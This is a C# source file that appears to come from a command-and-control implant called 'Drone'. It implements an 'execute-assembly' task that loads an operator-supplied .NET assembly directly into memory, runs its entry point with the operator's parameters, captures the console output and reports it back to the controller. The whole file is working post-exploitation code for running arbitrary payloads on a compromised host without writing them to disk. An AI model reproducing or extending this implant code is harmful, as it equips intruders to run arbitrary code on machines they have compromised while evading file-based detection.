using System;
using System.IO;
using System.Reflection;
using System.Text;

using Drone.Models;

namespace Drone.Functions;

public class ExecuteAssembly : DroneFunction
{
    public override string Name => "execute-assembly";
    
    public override void Execute(DroneTask task)
    {
        var stdOut = Console.Out;
        var stdErr = Console.Error;

        using var ms = new MemoryStream();
        using var sw = new StreamWriter(ms) { AutoFlush = true };
        
        Console.SetOut(sw);
        Console.SetError(sw);

        try
        {
            var asm = Assembly.Load(task.Artefact);
            asm.EntryPoint?.Invoke(null, new object[] { task.Parameters });
            sw.Flush();

            var output = Encoding.UTF8.GetString(ms.ToArray());
            Drone.SendOutput(task.TaskId, output);
        }
        catch (Exception e)
        {
            Drone.SendError(task.TaskId, e.Message);
        }
        finally
        {
            Console.SetOut(stdOut);
            Console.SetError(stdErr);
        }
    }
}